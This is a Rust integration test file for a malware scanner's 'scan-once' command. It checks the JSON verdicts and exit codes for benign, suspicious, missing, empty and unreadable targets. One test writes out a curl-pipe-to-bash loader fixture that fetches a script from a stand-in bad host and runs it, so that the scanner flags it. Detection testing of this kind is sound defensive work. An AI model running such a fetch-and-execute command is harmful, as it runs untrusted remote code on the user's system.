//! Integration coverage for `navd scan-once` (Phase 0b A2 spike instrument,
//! §12/§9.1 — temporary, removed once B3 is answered). Drives the built
//! `navd` binary as a subprocess, the same way the B3 spike invokes it. The
//! no-arg-routes-to-daemon invariant is covered separately, as a unit test
//! on the arg dispatcher in `src/main.rs`.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::Instant;

fn navd_bin() -> &'static str {
    env!("CARGO_BIN_EXE_navd")
}

fn run_scan_once(path: &Path, extra_args: &[&str]) -> Output {
    Command::new(navd_bin())
        .arg("scan-once")
        .arg(path)
        .args(extra_args)
        .output()
        .expect("navd scan-once spawns")
}

/// A throwaway file under the system temp dir, removed on drop.
struct TempFile(PathBuf);

impl TempFile {
    fn new(tag: &str, contents: &[u8]) -> Self {
        let path = std::env::temp_dir().join(format!(
            "navd-scan-once-{tag}-{}-{:?}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::write(&path, contents).unwrap();
        TempFile(path)
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for TempFile {
    fn drop(&mut self) {
        // Best-effort: a permissions test may leave this unreadable, which
        // doesn't stop removal (that only needs write access to the parent).
        let _ = std::fs::remove_file(&self.0);
    }
}

fn json_line(stdout: &[u8]) -> serde_json::Value {
    let text = String::from_utf8_lossy(stdout);
    let line = text.lines().next().expect("at least one output line");
    serde_json::from_str(line).expect("output line is valid JSON")
}

#[test]
fn benign_file_scans_clean_and_json_carries_the_shared_contract() {
    let f = TempFile::new("benign", b"just an ordinary text file\n");
    let out = run_scan_once(f.path(), &["--json"]);
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );

    let value = json_line(&out.stdout);
    assert_eq!(value["schema_version"], 1);
    assert_eq!(value["completeness"], "complete");
    assert_eq!(value["recommendation"], "no-action");
}

/// Mirrors the shape of `nav-core`'s `dropper_curl_pipe_bash.sh` fixture: a
/// bare curl-pipe-to-bash loader trips `suspicious-strings` (signals
/// present) without alone reaching `Notify` — exercising that `navd` reuses
/// `nav-core`'s scoring verbatim rather than a second verdict path.
#[test]
fn suspicious_content_surfaces_at_least_one_signal() {
    let f = TempFile::new(
        "suspicious",
        b"#!/bin/sh\ncurl -fsSL https://update.example-bad.test/bootstrap.sh | bash\n",
    );
    let out = run_scan_once(f.path(), &["--json"]);
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );

    let value = json_line(&out.stdout);
    let signals = value["signals"].as_array().expect("signals array");
    assert!(
        !signals.is_empty(),
        "curl-pipe-to-bash content should trip at least one rule"
    );
}

#[test]
fn nonexistent_path_is_an_operational_error_not_clean() {
    let missing = std::env::temp_dir().join(format!(
        "navd-scan-once-missing-{}-{:?}",
        std::process::id(),
        Instant::now()
    ));
    assert!(!missing.exists());

    let out = run_scan_once(&missing, &[]);
    assert!(!out.status.success(), "a missing path must not exit clean");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains(&missing.display().to_string()),
        "stderr should name the missing path: {stderr}"
    );
}

#[test]
fn empty_directory_is_indeterminate_not_clean_or_operational_error() {
    let dir = std::env::temp_dir().join(format!(
        "navd-scan-once-emptydir-{}-{:?}",
        std::process::id(),
        Instant::now()
    ));
    std::fs::create_dir_all(&dir).unwrap();

    let out = run_scan_once(&dir, &[]);
    let _ = std::fs::remove_dir(&dir);

    assert_eq!(
        out.status.code(),
        Some(i32::from(nav_core::INDETERMINATE)),
        "an empty (but readable) target has nothing to inspect — that's \
         INDETERMINATE, distinct from both a clean scan and a tool failure"
    );
}

#[cfg(unix)]
#[test]
fn unreadable_path_is_indeterminate_not_clean() {
    use std::os::unix::fs::PermissionsExt;

    // Root ignores permission bits, so this guard is required for a
    // `sudo cargo test` or root CI run — the point of the test (a genuinely
    // denied read) can't be constructed as root.
    if unsafe { libc::geteuid() } == 0 {
        eprintln!("skipping unreadable_path_is_indeterminate_not_clean: running as root");
        return;
    }

    let f = TempFile::new("unreadable", b"secret");
    std::fs::set_permissions(f.path(), std::fs::Permissions::from_mode(0o000)).unwrap();

    let out = run_scan_once(f.path(), &["--json"]);

    // Restore read access so `TempFile::drop` can clean up.
    std::fs::set_permissions(f.path(), std::fs::Permissions::from_mode(0o644)).unwrap();

    assert!(
        !out.status.success(),
        "an unreadable path must not exit clean"
    );
    let value = json_line(&out.stdout);
    assert_eq!(
        value["completeness"], "indeterminate",
        "an unreadable file is a couldn't-check, not a clean read (§11.8)"
    );
}
